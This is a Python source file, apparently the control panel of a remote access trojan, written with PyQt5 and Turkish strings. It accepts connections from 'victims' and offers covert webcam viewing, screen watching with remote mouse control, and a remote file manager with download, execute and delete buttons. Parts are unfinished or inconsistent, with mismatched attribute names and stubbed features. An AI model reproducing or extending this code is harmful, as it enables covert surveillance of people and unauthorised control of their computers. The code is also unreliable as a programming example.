import os
import pickle
import sys
from socket import gethostbyname, gethostname, socket
from threading import Thread
from time import sleep

import cv2
from pynput import keyboard, mouse
from PyQt5.QtCore import *
from PyQt5.QtGui import *
from PyQt5.QtWidgets import *
from win32api import GetLogicalDriveStrings

from firebase_manager import FirebaseManager
from victim import Victim

# from watch_screen import WatchScreen

# types: default, watch_screen, watch_camera, terminal, file_manager, listen_voice

IP ="192.168.1.25"
PORT = 123
victim_screens = {"watch_screen": {}, "watch_camera": {}, "terminal": {}, "file_manager": {}, "listen_voice": {}}
victims = {"client": {}, "watch_screen": {}, "watch_camera": {}, "terminal": {}, "file_manager": {}, "listen_voice": {}}
class Main(QMainWindow):
    def __init__(self):
        super().__init__()

        
        
        global victim_screens
        global victims

        

        self.firebase_manager = FirebaseManager()
        self.buildGui()
        self.show()
        Thread(target=self.listen).start()

    def buildGui(self):
        self.victim_list = QListWidget()

        self.setCentralWidget(self.victim_list)

        menu = QMenuBar(self)
        
        main_actions = QMenu("Main", menu)
        remote_actions = QMenu("Remote", menu)

        menu.addMenu(main_actions)
        menu.addMenu(remote_actions)

        main_actions.addAction("Enject", self.enject)
        main_actions.addAction("Refresh", self.refresh)

        remote_actions.addAction("Watch Camera", self.watch_camera_trigger)
        remote_actions.addAction("Watch Screen", self.watch_screen_trigger)
        remote_actions.addAction("Terminal", self.terminal_trigger)
        remote_actions.addAction("File Manager", self.file_manager_trigger)
        remote_actions.addAction("Listen Voice", self.listen_voice_trigger)
        
        self.setMenuBar(menu)


    def listen(self):
        global victim_screens
        global victims
        self.socket = socket()
        self.socket.bind((IP, PORT))
        self.socket.listen(1)
        while True:
            print("client bekleniyor...")
            client, addr = self.socket.accept()
            name , victim_type = client.recv(1024).decode("utf-8").lstrip("0").split("||")
            victims[victim_type][name]=Victim(client=client,victim_type=victim_type,name=name)
            print("client: "+str(victims[victim_type][name])+" baglandi")
            if victim_type == "client":
                self.refresh()



    def refresh(self):
        self.victim_list.clear()
        for name in dict(**victims["client"]):
            if victims["client"][name].check_alive():
                self.victim_list.addItem(name)
            else:
                victims["client"].pop(name)

    def enject(self):
        print("enject")

    def watch_camera_trigger(self):
        global victim_screens
        global victims
        selected_name = self.victim_list.selectedItems()[0].text()
        victims["client"][selected_name].send_data(pickle.dumps({"command":"watch_camera"}))
        sleep(1)
        victim_screens["watch_camera"][selected_name] = WatchCamera(victims["watch_camera"][selected_name])
        victim_screens["watch_camera"][selected_name].setup()
        

    def watch_screen_trigger(self):
        global victim_screens
        global victims
        selected_name = self.victim_list.selectedItems()[0].text()
        victims["client"][selected_name].send_data(pickle.dumps({"command":"watch_screen"}))
        sleep(1)
        victim_screens["watch_screen"][selected_name] = WatchScreen(victims["watch_screen"][selected_name])
        victim_screens["watch_screen"][selected_name].setup()


    def terminal_trigger(self):pass

    def file_manager_trigger(self):
        global victim_screens
        global victims
        selected_name = self.victim_list.selectedItems()[0].text()
        victims["client"][selected_name].send_data(pickle.dumps({"command":"file_manager"}))
        sleep(1)
        victim_screens["file_manager"][selected_name] = FileManager(victims["file_manager"][selected_name])
        victim_screens["file_manager"][selected_name].setup()

    def listen_voice_trigger(self):pass


class WatchCamera(Thread):
    def __init__(self, victim: Victim):
        super().__init__()
        self.victim = victim

    def run(self):
        while True:
            try:
                length = int(self.victim.client.recv(10).decode("utf-8"))
                buff = b''
                while len(buff) < length:
                    buff += self.victim.client.recv(length - len(buff))
                image_data = pickle.loads(buff)
                cv2.imshow("watch_camera", image_data)
                if cv2.waitKey(1) & 0XFF == ord("q"):
                        cv2.destroyAllWindows()
                        self.victim.close()
                        break
            except Exception as e:
                print("Kamera izleme kapatıldı: "+str(e))
                self.victim.close()
                break

    def setup(self):
        self.start()


class FileManager(QWidget):
    file_icons = {
        "file": "C:/Users/ertu1/Desktop/blank/resources/file.ico",
        "folder": "C:/Users/ertu1/Desktop/blank/resources/folder.ico",
        "txt": "C:/Users/ertu1/Desktop/blank/resources/txt.ico",
        }
    def __init__(self, victim: Victim):
        self.victim = victim


    def buildGui(self):
        self.setWindowTitle("File Manager of "+self.victim.name)
        g_lay = QGridLayout(self)
        self.remoteList = QListWidget()
        self.locale_list = QListWidget()
        # self.remoteList.setSelectionMode()
        # self.localList.setSelectionMode(QAbstractItemView.Ex)
        # self.remoteList.doubleClicked.connect(self.remoteListItemDoubleClicked)
        self.locale_list.doubleClicked.connect(self.locale_list_item_double_clicked)

        self.bufferEdit = QSpinBox()
        self.locale_dir_label = QLabel()
        self.remote_dir_label = QLabel()
        self.statusLabel = QLabel()
        refreshButton = QPushButton("Yenile")
        remoteBackButton = QPushButton("Geri")
        downloadButton = QPushButton("İndir")
        remoteExecuteButton = QPushButton("Çalıştır")
        remoteRenameButton = QPushButton("Yeniden adlandır")
        uploadButton = QPushButton("Yükle")
        localeBackButton = QPushButton("Geri")
        remoteDeleteButton = QPushButton("Sil")

        self.bufferEdit.setMinimum(1024)
        self.bufferEdit.setMaximum(1024 * 1024 * 1024)
        self.bufferEdit.setSingleStep(1024)
        self.bufferEdit.setValue(1024)
        refreshButton.setShortcut(QKeySequence("F5"))

        refreshButton.clicked.connect(self.refresh)
        # remoteBackButton.clicked.connect(self.remoteBack)
        # downloadButton.clicked.connect(lambda: Thread(target=self.download).start())
        # remoteExecuteButton.clicked.connect(self.remoteExecute)
        # remoteRenameButton.clicked.connect(self.remoteRename)
        # uploadButton.clicked.connect(lambda: Thread(target=self.upload).start())
        localeBackButton.clicked.connect(self.locale_back)
        # remoteDeleteButton.clicked.connect(self.remoteDelete)

        g_lay.addWidget(self.remote_dir_label, 1, 2)
        g_lay.addWidget(self.remoteList, 2, 2)
        g_lay.addWidget(remoteBackButton, 3, 2)
        g_lay.addWidget(downloadButton, 4, 2)
        g_lay.addWidget(remoteExecuteButton, 5, 2)
        g_lay.addWidget(remoteRenameButton, 6, 2)
        g_lay.addWidget(remoteDeleteButton, 7, 2)

        g_lay.addWidget(self.locale_dir_label, 1, 1)
        g_lay.addWidget(self.locale_list, 2, 1)
        g_lay.addWidget(uploadButton, 3, 1)
        g_lay.addWidget(localeBackButton, 4, 1)
        g_lay.addWidget(refreshButton, 5, 1)
        g_lay.addWidget(self.bufferEdit, 6, 1)
        g_lay.addWidget(self.statusLabel, 7, 1)

        self.locale_command("disks")
        self.remote_command("disks")

        # self.executeCommand("disks")
        # self.sendCommand("disks")

    def closeEvent(self, a0: QCloseEvent) -> None:
            try:self.victim.close()
            except: pass
            try: self.close()
            except:pass
            try:super().closeEvent(a0)
            except: pass

    def setup(self):
        super().__init__()
        self.buildGui()
        self.show()

    def refresh(self):
        if self.locale_dir_label.text() == "":
            self.locale_command("disks")
        else:
            self.locale_command("listdir",path=self.locale_dir_label.text())

        if self.remote_dir_label.text() == "":
            self.remote_command("disks")
        else:
            self.remote_command("listdir",path=self.remote_dir_label.text())

    def remote_command(self,command,**kwargs):
        if command == "disks":
            print("remote disks")
            if not self.victim.send_data(pickle.dumps({"command":"disks"})):
                self.close()
            data_length = int(self.victim.client.recv(10).decode("utf-8").lstrip("0"))
            data = b''
            while len(data) < data_length:
                data += self.victim.client.recv(data_length - len(data))
            data = pickle.loads(data)
            self.remoteList.clear()
            for item in data:
                item_widget = QListWidgetItem(QIcon(self.file_icons["folder"]), item)
                self.remoteList.addItem(item_widget)

    def locale_command(self, command,**kwargs):
        if command == "disks":
            self.locale_list.clear()
            self.locale_dir_label.setText("")
            dirs = [x for x in GetLogicalDriveStrings().split("\x00")[:-1]]
            for _dir in dirs:
                item = QListWidgetItem(QIcon(self.file_icons["folder"]), _dir)
                self.locale_list.addItem(item)
        elif command == "listdir":
            path = kwargs["path"]
            dirs = []
            files = []
            try:
                for i in os.listdir(path):
                    if (os.path.isdir(os.path.join(path, i))):
                        dirs.append(i)
                    else:
                        files.append(i)
            except:
                return
            self.locale_list.clear()
            self.locale_dir_label.setText(path)
            for _dir in dirs:
                try:
                    item_size = len(os.listdir(os.path.join(path, _dir)))
                except:
                    item_size = -1
                item_text = _dir +"\t"+ str(item_size)+ " file"
                item = QListWidgetItem(QIcon(self.file_icons["folder"]), item_text)
                self.locale_list.addItem(item)
            for _file in files:
                icon = QIcon(self.file_icons.get(_file.split(".")[-1],self.file_icons["file"]))
                try:
                    item_size = os.path.getsize(os.path.join(path, _file))
                except:
                    item_size = -1
                item_text = _file +"\t"+ str(FileManager.convertSizeType(item_size))
                item = QListWidgetItem(icon, item_text)
                self.locale_list.addItem(item)

    def locale_list_item_double_clicked(self):
        selected_text = self.locale_list.selectedItems()[0].text()
        if (len(selected_text.split("\t"))) > 1 and "-1" in selected_text.split("\t")[1]:
            return
        print("locale dir label text:"+self.locale_dir_label.text()+".")
        print("selected text:"+selected_text+".")
        if self.locale_dir_label.text() == "":
            path = selected_text
        else:
            path = os.path.join(self.locale_dir_label.text(), selected_text.split("\t")[0])
        if os.path.isdir(path):
            self.locale_command("listdir", path=path)
        else:
            try:
                os.startfile(path)
            except:
                pass

    def locale_back(self):
        if self.locale_dir_label.text() == "":
            return
        path = os.path.dirname(self.locale_dir_label.text())
        if path.count("\\") == 1:
            self.locale_command("disks")
        else:
            self.locale_command("listdir", path=os.path.join(path.split("\\")[0:-1]))

    @staticmethod
    def convertSizeType(size: int) -> str:
        if size == -1:
            return "---"
        if (size / 1024) > 1:
            kb = size / 1024
            sizeText = format(kb, ".2f") + " Kb"
            if (kb / 1024) > 1:
                mb = kb / 1024
                sizeText = format(mb, ".2f") + " Mb"
                if (mb / 1024) > 1:
                    gb = mb / 1024
                    sizeText = format(gb, ".2f") + " Gb"
        else:
            sizeText = str(size) + " byte"
        return sizeText

class WatchScreen(QWidget):
    def __init__(self,victim: Victim):
        self.victim = victim
        self.got_screen_size = False
        self.mouse_tracking_counter = 0
        self.is_flowing = False

    def buildGui(self):
        self.setWindowTitle("Watch Screen")

        v_lay = QVBoxLayout(self)
        c_lay = QHBoxLayout()

        startButton = QPushButton("Başlat")
  
        self.keyboardControlCheckBox = QCheckBox("Klavyeyi kontrol et")
        self.mouseControlCheckBox = QCheckBox("Mouseyi kontrol et")
        self.label = QLabel()

        startButton.clicked.connect(self.start)
        self.label.setScaledContents(True)
        self.label.mouseDoubleClickEvent = self.labelMouseDoubleClickEvent
        self.label.mousePressEvent = self.labelMousePressEvent
        self.label.mouseReleaseEvent = self.labelMouseReleaseEvent     

        c_lay.addWidget(startButton)
        c_lay.addWidget(self.keyboardControlCheckBox)
        c_lay.addWidget(self.mouseControlCheckBox)

        v_lay.addLayout(c_lay)
        v_lay.addWidget(self.label)


    def setup(self):
        super(WatchScreen,self).__init__()
        self.buildGui()
        self.show()


    def flow(self):
        while self.is_flowing:
            try:
                length = int(self.victim.client.recv(10).decode())
                print("resim boyutu:", length)
                data = b''
                while len(data) < length:
                    data += self.victim.client.recv(length - len(data))
                pixmap = QPixmap()
                pixmap.loadFromData(data)
                self.label.setPixmap(pixmap)
                if not self.got_screen_size:
                    self.setFixedSize(pixmap.width(), pixmap.height())
                    self.got_screen_size = True
            except Exception as e:
                print("Hata 5", "ekran izlerken bağlantı koptu", e)
                self.close()


    def start(self):
        self.victim.client.sendall(pickle.dumps({"command": "start"}))
        print(str(self.victim))
        self.is_flowing = True
        Thread(target=self.flow).start()

    def closeEvent(self, a0: QCloseEvent) -> None:
        if self.is_flowing:
            self.is_flowing = False
        try:
            self.victim.client.sendall(pickle.dumps({"command": "stop"}))
        except Exception as e:
            pass
        try:self.victim.close()
        except Exception as e: print("hata 2: ",e)
        try:
            self.close()
        except Exception as e:
            pass
        try:super().closeEvent(a0)
        except: pass

    

    def labelMouseMoveEvent(self, event: QMouseEvent):
        self.mouseTrackingCounter += 1
        if self.mouseTrackingCounter % 100 == 0 and self.mouseControlCheckBox.isChecked() and self.gotScreenSize:
            print(self.mouseTrackingCounter, end="\t")
            try:
                self.victim.client.sendall(pickle.dumps({"command": "moveMouse", "loc": self.getLocation(event)}))
            except Exception as e:
                print("Hata 1", "Bağlantı koptu", e)
                self.close()
                return None

    def labelMousePressEvent(self, event: QMouseEvent):
        if self.got_screen_size and self.mouseControlCheckBox.isChecked():
            button = self.getButton(event)
            if button is not None:
                data = {"command": "pressMouse", "loc": self.getLocation(event), "button": button}
                print(data)
        #         try:
        #             self.client.sendall(
                        # pickle.dumps({"command": "pressMouse", "loc": self.getLocation(event), "button": button}))
        #         except Exception as e:
        #             messagebox("Hata 2", "Bağlantı koptu", e)
        #             self.close()
        #             return None

    def labelMouseReleaseEvent(self, event: QMouseEvent):
        if self.got_screen_size and self.mouseControlCheckBox.isChecked():
            button = self.getButton(event)
            if button is not None:
                data = {"command": "releaseMouse", "loc": self.getLocation(event), "button": button}
                print(data)
        #         try:
        #             self.client.sendall(
        #                 pickle.dumps({"command": "releaseMouse", "loc": self.getLocation(event), "button": button}))
        #         except Exception as e:
        #             messagebox("Hata 3", "Bağlantı koptu", e)
        #             self.close()
        #             return None

    def labelMouseDoubleClickEvent(self, event: QMouseEvent):
        if self.got_screen_size and self.mouseControlCheckBox.isChecked():
            button = self.getButton(event)
            if button is not None:
                data = {"command": "doubleMouse", "loc": self.getLocation(event), "button": button}
                print(data)
        #         try:
        #             self.client.sendall(
        #                 pickle.dumps({"command": "doubleMouse", "loc": self.getLocation(event), "button": button}))
        #         except Exception as e:
        #             messagebox("Hata 4", "Bağlantı koptu", e)
        #             self.close()
        #             return None

    def getLocation(self, loc: QMouseEvent):
        if loc.x() != 0:
            if self.label.width() > self.x:
                x = loc.x() * (self.x / self.label.width())
            elif self.label.width() == self.x:
                x = loc.x()
            else:
                x = loc.x() * (self.label.width() / self.x)
        else:
            x = 0

        if loc.y() != 0:
            if self.label.height() > self.y:
                y = loc.y() * (self.y / self.label.height())
            elif self.label.height() == self.y:
                y = loc.y()
            else:
                y = loc.y() * (self.label.height() / self.y)
        else:
            y = 0

        return x, y

    def getButton(self, event: QMouseEvent):
        if self.gotScreenSize and self.mouseControlCheckBox.isChecked():
            if event.button() == Qt.LeftButton:
                return mouse.Button.left
            elif event.button() == Qt.RightButton:
                return mouse.Button.right
            elif event.button() == Qt.MidButton or event.button() == Qt.MiddleButton:
                return mouse.Button.middle
            else:
                return None
        else:
            return None


app = QApplication(sys.argv)
main = Main()
sys.exit(app.exec())
